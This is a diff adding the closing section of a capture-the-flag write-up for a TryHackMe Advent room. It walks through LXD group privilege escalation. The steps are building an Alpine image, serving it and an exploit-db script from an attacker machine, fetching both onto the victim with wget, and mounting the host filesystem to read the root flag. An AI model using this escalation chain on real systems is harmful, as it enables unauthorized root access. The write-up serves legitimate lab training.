@@ -2695,4 +2695,148 @@ id
 uid=1000(flynn) gid=1000(flynn) groups=1000(flynn),109(lxd)
 ```
 
-TODO
+Ok, so looks like we will be doing a LXD Privilege Escalation. So let's `git clone` the repository.
+
+```
+git clone https://github.com/saghul/lxd-alpine-builder.git
+```
+
+Now we can build alpine.
+
+```
+cd lxd-alpine-builder/
+sudo ./build-alpine
+```
+
+Now, there should be a gzip compressed data folder in the directory. We need to get this onto the victim box and so we can use `http-server`.
+
+So on my attacker machine I run the following:
+
+```
+bluemoon@dragonfly:~/ctf/thm/thm-advent/day24-the-trial-before-christmas/lxd-alpine-builder$ http-server
+Starting up http-server, serving ./
+Available on:
+  http://127.0.0.1:8081
+  http://172.16.57.163:8081
+  http://10.6.23.34:8081
+Hit CTRL-C to stop the server
+```
+
+Then on the victim machine, I can `wget` it.
+
+```
+flynn@light-cycle:~$ wget http://10.6.23.34:8081/alpine-v3.12-x86_64-20201225_1041.tar.gz
+<23.34:8081/alpine-v3.12-x86_64-20201225_1041.tar.gz
+--2020-12-25 15:48:13--  http://10.6.23.34:8081/alpine-v3.12-x86_64-20201225_1041.tar.gz
+Connecting to 10.6.23.34:8081... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3203370 (3.1M) [application/gzip]
+Saving to: ‘alpine-v3.12-x86_64-20201225_1041.tar.gz’
+
+alpine-v3.12-x86_64 100%[===================>]   3.05M  1.10MB/s    in 2.8s    
+
+2020-12-25 15:48:16 (1.10 MB/s) - ‘alpine-v3.12-x86_64-20201225_1041.tar.gz’ saved [3203370/3203370]
+```
+
+Next, we can download the shell script from `https://www.exploit-db.com/exploits/46978` and also send that file over to the victim using `http-server`.
+
+```
+bluemoon@dragonfly:~/ctf/thm/thm-advent/day24-the-trial-before-christmas$ http-server
+Starting up http-server, serving ./
+Available on:
+  http://127.0.0.1:8081
+  http://172.16.57.163:8081
+  http://10.6.23.34:8081
+Hit CTRL-C to stop the server
+```
+```
+flynn@light-cycle:~$ wget http://10.6.23.34:8081/46978.sh
+wget http://10.6.23.34:8081/46978.sh
+--2020-12-25 15:57:35--  http://10.6.23.34:8081/46978.sh
+Connecting to 10.6.23.34:8081... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1500 (1.5K) [application/x-sh]
+Saving to: ‘46978.sh’
+
+46978.sh            100%[===================>]   1.46K  --.-KB/s    in 0s      
+
+2020-12-25 15:57:35 (192 MB/s) - ‘46978.sh’ saved [1500/1500]
+```
+
+Now, we can see both files are on the victim machine
+
+```
+-rw-rw-r-- 1 flynn flynn    1500 Dec 25 15:54 46978.sh
+-rw-rw-r-- 1 flynn flynn 3203370 Dec 25 15:41 alpine-v3.12-x86_64-20201225_1041.tar.gz
+```
+
+Next, we can mark `46978.sh` as executable and run it.
+
+```
+flynn@light-cycle:~$ chmod +x 46978.sh
+flynn@light-cycle:~$ ./46978.sh -f alpine-v3.12-x86_64-20201225_1041.tar.gz
+```
+
+Once we are in the lxc container, we can move to the root directory of the host machine which is mounted at `/mnt/root`.
+
+```
+~ # cd /mnt/root
+cd /mnt/root
+/mnt/root # ls -l    
+ls -l
+total 239788
+drwxr-xr-x    2 root     root          4096 Dec 18 14:17 bin
+drwxr-xr-x    3 root     root          4096 Dec 18 14:22 boot
+drwxr-xr-x   17 root     root          3680 Dec 25 15:24 dev
+drwxr-xr-x   94 root     root          4096 Dec 20 04:51 etc
+drwxr-xr-x    3 root     root          4096 Dec 18 14:08 home
+lrwxrwxrwx    1 root     root            34 Dec 18 14:18 initrd.img -> boot/initrd.img-4.15.0-128-generic
+lrwxrwxrwx    1 root     root            33 Dec 18 14:04 initrd.img.old -> boot/initrd.img-4.15.0-20-generic
+drwxr-xr-x   22 root     root          4096 Dec 18 14:06 lib
+drwxr-xr-x    2 root     root          4096 Dec 18 14:15 lib64
+drwx------    2 root     root         16384 Dec 18 14:04 lost+found
+drwxr-xr-x    3 root     root          4096 Dec 18 14:04 media
+drwxr-xr-x    2 root     root          4096 Apr 26  2018 mnt
+drwxr-xr-x    2 root     root          4096 Apr 26  2018 opt
+dr-xr-xr-x  151 root     root             0 Dec 25 15:24 proc
+drwx------    4 root     root          4096 Dec 20 03:51 root
+drwxr-xr-x   26 root     root           860 Dec 25 16:05 run
+drwxr-xr-x    2 root     root         12288 Dec 18 14:17 sbin
+drwxr-xr-x    2 root     root          4096 Dec 18 14:09 snap
+drwxr-xr-x    2 root     root          4096 Apr 26  2018 srv
+-rw-------    1 root     root     245452800 Dec 18 14:04 swapfile
+dr-xr-xr-x   13 root     root             0 Dec 25 15:24 sys
+drwxrwxrwt   10 root     root          4096 Dec 25 16:05 tmp
+drwxr-xr-x   10 root     root          4096 Dec 18 14:04 usr
+drwxr-xr-x   14 root     root          4096 Dec 18 14:07 var
+lrwxrwxrwx    1 root     root            31 Dec 18 14:18 vmlinuz -> boot/vmlinuz-4.15.0-128-generic
+lrwxrwxrwx    1 root     root            30 Dec 18 14:04 vmlinuz.old -> boot/vmlinuz-4.15.0-20-generic
+```
+
+### Getting root flag: `root.txt`
+
+Now, we can change into the root user's home directory and cat out the flag.
+
+```
+/mnt/root # cd root  
+/mnt/root/root # ls -alF
+total 32
+drwx------    4 root     root          4096 Dec 20 03:51 ./
+drwxr-xr-x   23 root     root          4096 Dec 18 14:18 ../
+lrwxrwxrwx    1 root     root             9 Dec 18 17:43 .bash_history -> /dev/null
+-rw-r--r--    1 root     root          3106 Apr  9  2018 .bashrc
+drwxr-x---    3 root     root          4096 Dec 20 03:51 .config/
+lrwxrwxrwx    1 root     root             9 Dec 19 15:15 .mysql-history -> /dev/null
+-rw-------    1 root     root           264 Dec 19 15:19 .mysql_history
+-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
+drwx------    2 root     root          4096 Dec 18 17:57 .ssh/
+-r--------    1 root     root           600 Dec 19 20:18 root.txt
+/mnt/root/root # cat root.txt
+THM{FLYNN_LIVES}
+
+
+
+"As Elf McEager claimed the root flag a click could be heard as a small chamber on the anterior of the NUC popped open. Inside, McEager saw a small object, roughly the size of an SD card. As a moment, he realized that was exactly what it was. Perplexed, McEager shuffled around his desk to pick up the card and slot it into his computer. Immediately this prompted a window to open with the word 'HOLO' embossed in the center of what appeared to be a network of computers. Beneath this McEager read the following: Thank you for playing! Merry Christmas and happy holidays to all!"
+```
+
+Root flag: `THM{FLYNN_LIVES}`
